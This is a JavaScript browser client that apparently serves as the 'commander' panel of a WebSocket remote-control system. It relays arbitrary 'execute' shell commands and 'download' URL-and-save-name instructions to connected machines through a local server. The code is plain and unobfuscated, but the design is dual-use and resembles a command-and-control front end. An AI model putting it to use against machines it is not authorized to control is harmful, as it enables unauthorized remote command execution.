var connection;
window.addEventListener("load", function () {
    // Define the connection
    connection = new WebSocket("ws://localhost:8999");

    // Open the connection
    connection.onopen = function () {
        // Send random string as ID
        var data = {};
        data.client = {};
        data.client.id = makeid();
        data.client.type = "commander";
        // Send the INIT data
        connection.send((JSON.stringify(data)));

        // Get the form
        document.getElementById("form").onsubmit = function (event) {
            // Get the message element
            var msg = document.getElementById("msg");
            var cmd = document.getElementById("cmd");

            // Check if message has value
            if (msg.value) {
                // Make the data
                var data = {};
                data.type = "message";
                data.message = msg.value;

                // Send the MESSAGE data
                connection.send((JSON.stringify(data)));
            }

            if (cmd.value) {
                // Make the data
                var data = {};
                data.type = "execute";
                data.command = cmd.value;

                // Send the MESSAGE data
                connection.send((JSON.stringify(data)));
            }
            // Unset the message field
            cmd.value = "";
            msg.value = "";
            event.preventDefault();
        }

        // Get the form
        document.getElementById("downloadform").onsubmit = function (event) {
            // Get the message element
            var dld = document.getElementById("dld");
            var sav = document.getElementById("sav");

            if (dld.value && sav.value) {
                // Make the data
                var data = {};
                data.type = "download";
                data.command = dld.value;
                data.savename = sav.value;

                // Send the MESSAGE data
                connection.send((JSON.stringify(data)));
            }
            // Unset the message field
            cmd.value = "";
            msg.value = "";
            event.preventDefault();
        }
    };

    // EVENT on close
    connection.onclose = function () {
        console.log("Connection closed");
    };

    // EVENT on error
    connection.onerror = function () {
        console.error("Connection error");
    };

    // EVENT on message
    connection.onmessage = function (event) {
        var div = document.createElement("div");
        div.textContent = event.data;
        document.body.appendChild(div);
    }
});


// Random ID function
function makeid() {
    var text = "";
    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

    for (var i = 0; i < 5; i++)
        text += possible.charAt(Math.floor(Math.random() * possible.length));

    return text;
}